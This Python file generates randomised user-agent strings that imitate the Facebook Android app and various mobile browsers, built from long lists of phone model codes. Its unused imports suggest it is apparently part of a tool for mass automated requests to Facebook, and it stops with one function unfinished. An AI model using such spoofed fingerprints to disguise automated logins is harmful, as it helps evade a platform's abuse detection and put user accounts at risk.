import os
import sys
import json
import uuid
import string
import random
import requests,re,time
from requests.exceptions import ConnectionError as cerror
from concurrent.futures import ThreadPoolExecutor as tred

def create_ua():
    fbav = str(random.randint(100,430))+".0.0."+str(random.randint(11,50))+"."+str(random.randint(100,250))
    fbbv = str(random.randint(111111111,999999999))
    androv = str(random.uniform(3.0,13.0))
    fblc = random.choice(["en_US","en_GB","en_IN","bn_IN","hi_IN","np_NP","en_NP","id_ID"])
    fbcrr = random.choice(["MTN","AWCC","Roshan","Zong","Jazz","Etisalat","null","",""])
    fbcr = random.choice(["Jio","Airtel","Vodafone","BSNL","Vi","jio","null","nCell","Nepal Telecom"])
    abc = random.choice(["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"])
    model = f"{abc}{str(random.randint(111,999))}{abc}"
    samsung_model = random.choice(["Samsung Galaxy S21 Ultra", "Samsung Galaxy Note 20 Ultra", "Samsung Galaxy S20 FE", "Samsung Galaxy A52", "Samsung Galaxy A32", "Samsung Galaxy S10+", "Samsung Galaxy Note 10", "Samsung Galaxy A71", "Samsung Galaxy A12", "Samsung Galaxy M31", "Samsung Galaxy S9", "Samsung Galaxy A42", "Samsung Galaxy A22", "Samsung Galaxy A02", "Samsung Galaxy Z Fold 2", "Samsung Galaxy A51", "Samsung Galaxy A31", "Samsung Galaxy M21", "Samsung Galaxy S8", "Samsung Galaxy A72", "Samsung Galaxy A52 5G", "Samsung Galaxy A21s", "Samsung Galaxy M51", "Samsung Galaxy S7", "Samsung Galaxy Note 9"])
    android_version = str(random.randrange(6,13))
    UA1 = "[FBAN/FB4A;FBAV/"+str(random.randint(50,250))+".0.0."+str(random.randint(11,50))+"."+str(random.randint(100,250))+";FBBV/"+str(random.randint(111111111,999999999))+";"+f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1080,height=2076}};FBLC/{fblc};FBRV/0;FBCR/{fbcr};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{samsung_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
    UA2 = f"Dalvik/2.1.0 (Linux; U; Android {androv}; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/{fbav};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{fbbv};FBCR/{fbcr};FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{androv};FBCA/armeabi-v7a:armeabi;FBDM/{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]"
    UA3 = f"Dalvik/1.6.0_(Linux;_U;_Android_{androv};_HTC6525LVW_Build/KTU84P)_[FBAN/Orca-Android;FBAV/{fbav};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/HTC;FBBD/htc;FBDV/HTC6525LVW;FBSV/{androv};FBCA/armeabi-v7a:armeabi;FBDM/{{density=3.0,width=1080,height=1776}};FB_FW/1;]"
    uassss = random.choice([UA1, UA2, UA3])
    return uassss
    
def mbasic_ua():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku9 = f"Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"
    uazku9 = f"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8
    
def basic_ua():
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    build_nokiax = ['JDQ39','JZO54K']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
